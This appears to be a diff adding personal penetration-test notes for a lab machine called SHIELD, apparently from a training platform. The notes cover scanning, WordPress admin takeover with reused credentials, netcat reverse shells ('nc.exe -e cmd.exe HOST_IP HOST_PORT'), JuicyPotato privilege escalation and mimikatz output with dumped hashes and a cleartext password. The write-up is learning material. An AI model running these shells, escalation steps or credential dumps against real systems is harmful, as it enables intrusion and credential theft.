@@ -1,0 +1,74 @@
+---NMAP SCAN---
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+---using gobuster to find a subdir---
+*gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.29
+found /wordpress
+found http://10.10.10.29/wordpress/wp-login.php exploring the site but a wordpress enum could be used too
+*using a msf scanner/https/wordpress_login_enum found the login 'admin'
+trying to login with --> admin / P@s5w0rd! FOUND EARLIER ON OTHER MACHINES
+SUCCESS
+*using a msf expolit/unix/webapp/wp_admin_shell_upload to a reverse shell
+*DONE
+
+---stable shell---
+downloading a netcat for windows nc.exe
+uploading the netcat using meterpreter cmd
+*upload nc.exe
+creating a listener on host
+*execute -f nc.exe -a "-e cmd.exe HOST_IP HOST_PORT"
+stable shell done
+
+---SYSINFO---
+running sysinfo on meterpreter
+*sysinfo
+Computer    : SHIELD
+OS          : Windows NT SHIELD 10.0 build 14393 (Windows Server 2016) i586
+Meterpreter : php/windows
+
+
+---privilege scalation---
+using ROTTEN POTATO exploit 
+actualy using the JuicyPotato
+*echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe IP PORT > shell.bat
+JuicyPotato to get another reverse shell but with admin privilege
+
+
+
+---- POST EXPLOITAITON---
+using mimikatz.exe to get user/pass
+*sekurlsa::logonpasswords return:
+*mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 341436 (00000000:000535bc)
+Session           : Interactive from 1
+User Name         : sandra
+Domain            : MEGACORP
+Logon Server      : PATHFINDER
+Logon Time        : 8/6/2020 2:20:10 PM
+SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
+        msv :
+         [00000003] Primary
+         * Username : sandra
+         * Domain   : MEGACORP
+         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
+         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
+         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
+        tspkg :
+        wdigest :
+         * Username : sandra
+         * Domain   : MEGACORP
+         * Password : (null)
+        kerberos :
+         * Username : sandra
+         * Domain   : MEGACORP.LOCAL
+         * Password : Password1234!
+        ssp :
+        credman :
